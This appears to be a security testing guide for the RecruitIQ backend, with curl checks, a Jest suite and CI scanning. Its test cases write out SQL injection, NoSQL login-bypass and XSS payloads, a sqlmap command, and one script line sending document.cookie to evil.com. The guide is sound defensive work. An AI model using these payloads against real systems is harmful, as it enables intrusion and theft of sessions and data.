# Security Testing Guide

This document provides comprehensive guidelines for testing the security features of the RecruitIQ backend application.

## Table of Contents

1. [Overview](#overview)
2. [Testing Tools](#testing-tools)
3. [Authentication Testing](#authentication-testing)
4. [Authorization Testing](#authorization-testing)
5. [Input Validation Testing](#input-validation-testing)
6. [SQL Injection Testing](#sql-injection-testing)
7. [XSS Testing](#xss-testing)
8. [CSRF Testing](#csrf-testing)
9. [File Upload Security Testing](#file-upload-security-testing)
10. [Rate Limiting Testing](#rate-limiting-testing)
11. [Encryption Testing](#encryption-testing)
12. [Security Headers Testing](#security-headers-testing)
13. [Automated Security Testing](#automated-security-testing)
14. [Penetration Testing](#penetration-testing)
15. [Compliance Testing](#compliance-testing)

## Overview

Security testing should be performed:
- Before each major release
- After implementing new features
- As part of CI/CD pipeline (automated tests)
- During scheduled security audits
- After any security incident

## Testing Tools

### Required Tools

1. **OWASP ZAP** (Zed Attack Proxy)
   - Download: https://www.zaproxy.org/download/
   - Purpose: Automated vulnerability scanning, manual penetration testing

2. **Postman** or **Insomnia**
   - Purpose: API endpoint testing, authentication testing

3. **Burp Suite** (optional, professional)
   - Purpose: Advanced penetration testing

4. **SQLMap** (optional)
   - Purpose: SQL injection testing

5. **npm audit** / **Snyk**
   - Purpose: Dependency vulnerability scanning

### Installation

```bash
# Install OWASP ZAP (Windows)
# Download and install from https://www.zaproxy.org/download/

# Install Snyk
npm install -g snyk
snyk auth

# Install security testing dependencies
npm install --save-dev jest supertest
```

## Authentication Testing

### Test Cases

#### 1. Password Security

**Test**: Weak password rejection
```bash
POST /api/auth/register
{
  "email": "test@example.com",
  "password": "123456",  // Should be rejected
  "name": "Test User"
}

# Expected: 400 Bad Request
# Response should indicate password requirements
```

**Test**: Strong password acceptance
```bash
POST /api/auth/register
{
  "email": "test@example.com",
  "password": "SecureP@ssw0rd!2024",
  "name": "Test User"
}

# Expected: 201 Created
```

#### 2. Login Attempts

**Test**: Failed login tracking
```bash
# Attempt 1-5 failed logins
for i in {1..5}; do
  curl -X POST http://localhost:4000/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email":"test@example.com","password":"wrong"}'
done

# Expected: After 5 attempts, account should be locked
# Security monitor should generate brute force alert
```

#### 3. JWT Token Security

**Test**: Expired token rejection
```bash
# Use an expired JWT token
curl -X GET http://localhost:4000/api/candidates \
  -H "Authorization: Bearer <expired_token>"

# Expected: 401 Unauthorized
```

**Test**: Invalid token rejection
```bash
curl -X GET http://localhost:4000/api/candidates \
  -H "Authorization: Bearer invalid_token_here"

# Expected: 401 Unauthorized
```

**Test**: Token refresh
```bash
POST /api/auth/refresh
{
  "refreshToken": "<valid_refresh_token>"
}

# Expected: 200 OK with new access token
```

#### 4. Password Reset Security

**Test**: Password reset flow
```bash
# Step 1: Request reset
POST /api/auth/forgot-password
{"email": "test@example.com"}

# Expected: 200 OK (regardless of email existence for security)

# Step 2: Reset with token
POST /api/auth/reset-password
{
  "token": "<reset_token>",
  "password": "NewSecureP@ssw0rd!2024"
}

# Expected: 200 OK
```

**Test**: Expired reset token
```bash
# Wait for token expiration (15 minutes)
POST /api/auth/reset-password
{
  "token": "<expired_token>",
  "password": "NewSecureP@ssw0rd!2024"
}

# Expected: 400 Bad Request
```

## Authorization Testing

### Test Cases

#### 1. Role-Based Access Control

**Test**: Admin-only endpoint access
```bash
# As regular user
GET /api/users
Authorization: Bearer <user_token>

# Expected: 403 Forbidden

# As admin
GET /api/users
Authorization: Bearer <admin_token>

# Expected: 200 OK
```

#### 2. Resource Ownership

**Test**: User can only access own data
```bash
# User A trying to access User B's data
GET /api/candidates/123  # Belongs to User B
Authorization: Bearer <user_a_token>

# Expected: 403 Forbidden or 404 Not Found
```

## Input Validation Testing

### Test Cases

#### 1. SQL Injection Attempts

**Test**: SQL injection in query parameters
```bash
GET /api/candidates?search='; DROP TABLE users; --
Authorization: Bearer <token>

# Expected: 400 Bad Request or sanitized input
# Should NOT execute SQL
```

#### 2. XSS Attempts

**Test**: Script injection in form fields
```bash
POST /api/candidates
Authorization: Bearer <token>
{
  "name": "<script>alert('XSS')</script>",
  "email": "test@example.com"
}

# Expected: Input should be sanitized
# Script tags should be escaped or removed
```

#### 3. NoSQL Injection

**Test**: MongoDB-style injection
```bash
POST /api/auth/login
{
  "email": {"$ne": null},
  "password": {"$ne": null}
}

# Expected: 400 Bad Request
# Should not bypass authentication
```

## SQL Injection Testing

### Manual Testing

```bash
# Test 1: Union-based injection
GET /api/jobs?id=1' UNION SELECT null,username,password FROM users--

# Test 2: Boolean-based blind injection
GET /api/jobs?id=1' AND 1=1--
GET /api/jobs?id=1' AND 1=2--

# Test 3: Time-based blind injection
GET /api/jobs?id=1' AND SLEEP(5)--

# All should return 400 Bad Request or sanitized results
```

### Automated Testing with SQLMap

```bash
# Install SQLMap
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

# Test an endpoint
python sqlmap.py -u "http://localhost:4000/api/jobs?id=1" \
  --cookie="token=<your_jwt_token>" \
  --level=5 --risk=3

# Expected: No vulnerabilities found
```

## XSS Testing

### Test Cases

**Test**: Stored XSS
```bash
POST /api/jobs
Authorization: Bearer <token>
{
  "title": "<img src=x onerror=alert('XSS')>",
  "description": "<script>document.location='http://evil.com?cookie='+document.cookie</script>"
}

# Expected: Content should be escaped/sanitized
```

**Test**: Reflected XSS
```bash
GET /api/search?q=<script>alert('XSS')</script>

# Expected: Script should not execute
# Response should escape HTML entities
```

## CSRF Testing

**Test**: CSRF token validation
```bash
# Attempt request without CSRF token
POST /api/candidates
# (without X-CSRF-Token header)

# Expected: 403 Forbidden (if CSRF protection enabled)
```

## File Upload Security Testing

### Test Cases

#### 1. Malicious File Upload

**Test**: Upload executable file
```bash
# Create a test file
echo "malicious content" > test.exe

# Attempt upload
POST /api/upload
Content-Type: multipart/form-data
Authorization: Bearer <token>
[file: test.exe]

# Expected: 400 Bad Request
# Should only allow image/pdf files
```

#### 2. File Size Limit

**Test**: Upload oversized file
```bash
# Create 11MB file (limit is 10MB)
dd if=/dev/zero of=large.pdf bs=1M count=11

# Attempt upload
POST /api/upload
[file: large.pdf]

# Expected: 413 Payload Too Large
```

#### 3. MIME Type Validation

**Test**: Fake file extension
```bash
# Create .exe file renamed to .pdf
mv malicious.exe fake.pdf

# Attempt upload
POST /api/upload
[file: fake.pdf]

# Expected: 400 Bad Request
# MIME type validation should catch this
```

## Rate Limiting Testing

### Test Cases

**Test**: API rate limit enforcement
```bash
# Send 101 requests in rapid succession (limit is 100/15min)
for i in {1..101}; do
  curl http://localhost:4000/api/candidates
done

# Expected: First 100 succeed, 101st returns 429 Too Many Requests
```

**Test**: Login rate limiting
```bash
# Attempt 6 logins in rapid succession (limit is 5/15min)
for i in {1..6}; do
  curl -X POST http://localhost:4000/api/auth/login \
    -d '{"email":"test@example.com","password":"password"}'
done

# Expected: First 5 attempts allowed, 6th blocked with 429
```

## Encryption Testing

### Test Cases

#### 1. Data Encryption at Rest

**Test**: Verify sensitive fields are encrypted
```bash
# Direct database query
psql -d recruitiq_dev -c "SELECT email, password_hash FROM users LIMIT 1;"

# Expected:
# - password_hash should be bcrypt hash
# - email should be AES-encrypted ciphertext (if encryption enabled)
```

#### 2. TLS/HTTPS

**Test**: HTTPS enforcement
```bash
curl http://localhost:4000/api/candidates

# Expected: Redirect to https:// or error in production
```

**Test**: TLS version
```bash
openssl s_client -connect api.recruitiq.com:443 -tls1_2

# Expected: Should fail (only TLS 1.3 allowed)

openssl s_client -connect api.recruitiq.com:443 -tls1_3

# Expected: Should succeed
```

## Security Headers Testing

**Test**: Verify security headers
```bash
curl -I http://localhost:4000/api/health

# Expected headers:
# Strict-Transport-Security: max-age=31536000; includeSubDomains
# X-Content-Type-Options: nosniff
# X-Frame-Options: DENY
# X-XSS-Protection: 1; mode=block
# Content-Security-Policy: default-src 'self'
```

## Automated Security Testing

### CI/CD Integration

Create `.github/workflows/security.yml`:

```yaml
name: Security Tests

on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'
      
      - name: Install dependencies
        run: npm ci
        working-directory: ./backend
      
      - name: Run npm audit
        run: npm audit --audit-level=high
        working-directory: ./backend
      
      - name: Run Snyk security scan
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high
      
      - name: Run security tests
        run: npm test -- security.test.js
        working-directory: ./backend
```

### Security Test Suite

Create `backend/tests/security.test.js`:

```javascript
import request from 'supertest';
import app from '../src/app.js';

describe('Security Tests', () => {
  describe('Authentication', () => {
    test('should reject weak passwords', async () => {
      const res = await request(app)
        .post('/api/auth/register')
        .send({
          email: 'test@example.com',
          password: '123456',
          name: 'Test User'
        });
      
      expect(res.status).toBe(400);
      expect(res.body.error).toMatch(/password/i);
    });
    
    test('should reject invalid JWT tokens', async () => {
      const res = await request(app)
        .get('/api/candidates')
        .set('Authorization', 'Bearer invalid_token');
      
      expect(res.status).toBe(401);
    });
  });
  
  describe('Input Validation', () => {
    test('should sanitize SQL injection attempts', async () => {
      const res = await request(app)
        .get('/api/candidates?search=\'; DROP TABLE users; --')
        .set('Authorization', `Bearer ${validToken}`);
      
      expect(res.status).not.toBe(500);
      // Should not execute SQL injection
    });
    
    test('should escape XSS attempts', async () => {
      const res = await request(app)
        .post('/api/candidates')
        .set('Authorization', `Bearer ${validToken}`)
        .send({
          name: '<script>alert("XSS")</script>',
          email: 'test@example.com'
        });
      
      expect(res.status).toBe(201);
      expect(res.body.data.name).not.toContain('<script>');
    });
  });
  
  describe('Authorization', () => {
    test('should deny access to admin endpoints for regular users', async () => {
      const res = await request(app)
        .get('/api/users')
        .set('Authorization', `Bearer ${userToken}`);
      
      expect(res.status).toBe(403);
    });
  });
  
  describe('Rate Limiting', () => {
    test('should enforce rate limits', async () => {
      const requests = [];
      
      for (let i = 0; i < 101; i++) {
        requests.push(
          request(app).get('/api/health')
        );
      }
      
      const responses = await Promise.all(requests);
      const rateLimited = responses.filter(r => r.status === 429);
      
      expect(rateLimited.length).toBeGreaterThan(0);
    });
  });
  
  describe('Security Headers', () => {
    test('should include security headers', async () => {
      const res = await request(app).get('/api/health');
      
      expect(res.headers['x-content-type-options']).toBe('nosniff');
      expect(res.headers['x-frame-options']).toBe('DENY');
      expect(res.headers['strict-transport-security']).toBeDefined();
    });
  });
});
```

## Penetration Testing

### OWASP ZAP Automated Scan

```bash
# Start ZAP in daemon mode
zap.sh -daemon -port 8090 -config api.disablekey=true

# Run automated scan
zap-cli quick-scan -s xss,sqli -r http://localhost:4000

# Generate report
zap-cli report -o security-report.html -f html
```

### Manual Penetration Testing Checklist

- [ ] Test all authentication endpoints
- [ ] Test authorization on all protected endpoints
- [ ] Test input validation on all forms
- [ ] Test file upload functionality
- [ ] Test rate limiting on critical endpoints
- [ ] Test session management
- [ ] Test password reset flow
- [ ] Test API error responses (no information leakage)
- [ ] Test CORS configuration
- [ ] Test security headers
- [ ] Test encryption of sensitive data
- [ ] Test logging of security events

## Compliance Testing

### GDPR Compliance

- [ ] User data export functionality works
- [ ] User data deletion functionality works
- [ ] Consent tracking is implemented
- [ ] Data encryption for PII is enabled
- [ ] Audit logs track data access
- [ ] Privacy policy is up to date

### SOC 2 Compliance

- [ ] All security events are logged
- [ ] Access controls are enforced
- [ ] Encryption is implemented
- [ ] Incident response plan exists
- [ ] Regular security audits performed
- [ ] Employee training documented

## Reporting

### Security Test Report Template

```markdown
# Security Test Report
Date: [DATE]
Tester: [NAME]
Application Version: [VERSION]

## Executive Summary
[Brief overview of testing performed and key findings]

## Test Results

### Critical Issues
- None / [List critical issues]

### High Priority Issues
- None / [List high priority issues]

### Medium Priority Issues
- None / [List medium priority issues]

### Low Priority Issues
- None / [List low priority issues]

## Detailed Findings

### Finding 1: [Title]
**Severity**: Critical/High/Medium/Low
**Description**: [Detailed description]
**Steps to Reproduce**: [Steps]
**Impact**: [Impact]
**Remediation**: [How to fix]
**Status**: Open/Fixed/Won't Fix

## Recommendations
[List of recommendations for improving security]

## Conclusion
[Overall security posture assessment]
```

## Continuous Security Testing

### Weekly Tasks
- Run automated dependency scans
- Review security logs for anomalies
- Check for new CVEs affecting dependencies

### Monthly Tasks
- Run full OWASP ZAP scan
- Review and update security policies
- Conduct security training refresher

### Quarterly Tasks
- Full penetration testing
- Security architecture review
- Update threat model
- Review incident response plan

## Resources

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- CWE Top 25: https://cwe.mitre.org/top25/
- NIST Cybersecurity Framework: https://www.nist.gov/cyberframework

## Contact

For security concerns or to report vulnerabilities:
- Email: security@recruitiq.com
- Bug Bounty Program: [URL if applicable]
